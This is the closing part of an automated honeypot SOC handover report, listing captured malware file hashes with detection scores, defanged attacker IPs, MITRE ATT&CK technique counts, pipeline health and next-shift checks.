| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `84.216.60[.]18` | SE | Ownit Broadband | **100** ⚠️ | 3 |
| `31.56.209[.]39` | NL | SWISSNET LLC | **100** ⚠️ | 50 |
| `115.93.19[.]12` | KR | LG DACOM Corporation | **100** ⚠️ | 6 |
| `106.75.77[.]231` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 17 |
| `14.103.63[.]16` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `106.75.214[.]209` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 21 |
| `118.163.113[.]53` | TW | Chunghwa Telecom Co.,Ltd. | **87** ⚠️ | 50 |
| `91.99.206[.]46` | DE | Hetzner Online GmbH | **74** | 0 |
| `39.96.222[.]211` | CN | Aliyun Computing Co., LTD | **73** | 0 |
| `194.44.110[.]114` | UA | TzOV Biznes i Technologii | **47** | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 71 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 39 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 78 cases |
| Tool 34  | Credential Extractor        | ✅ 67 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (5.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 6 recon entry/entries in table (3 group(s) consolidating 43 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T17:02:40Z_
